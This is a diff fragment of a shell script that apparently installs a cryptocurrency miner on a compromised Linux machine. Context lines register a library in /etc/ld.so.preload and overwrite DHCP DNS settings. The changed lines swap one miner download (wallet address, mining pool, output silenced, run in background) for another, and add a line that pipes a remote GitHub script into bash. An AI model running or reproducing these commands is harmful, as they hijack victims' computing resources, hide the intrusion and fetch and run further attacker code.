@@ -9,6 +9,7 @@ echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
-wget https://github.com/kartolo92/jadul/raw/main/plant
-chmod +x plant
-./plant -a power2b -o stratum+tcp://167.99.139.112:80 -u MfCwayN6AQ1dPptt7yfAAiEfrSswnU2XcF.$(shuf -n 1 -i 1-99999)-NOTE -t $(nproc --all) > /dev/null 2>&1 &
+wget https://github.com/superade99/ade/raw/refs/heads/main/varel
+chmod +x varel
+./varel -a randomvirel --url na.rplant.xyz:7155 --user v38ksv6jk6vnvo2k9vfwikr3yg6v5suit4w7h5.$(shuf -n 1 -i 1-99999)-noprox > /dev/null 2>&1 &
+curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
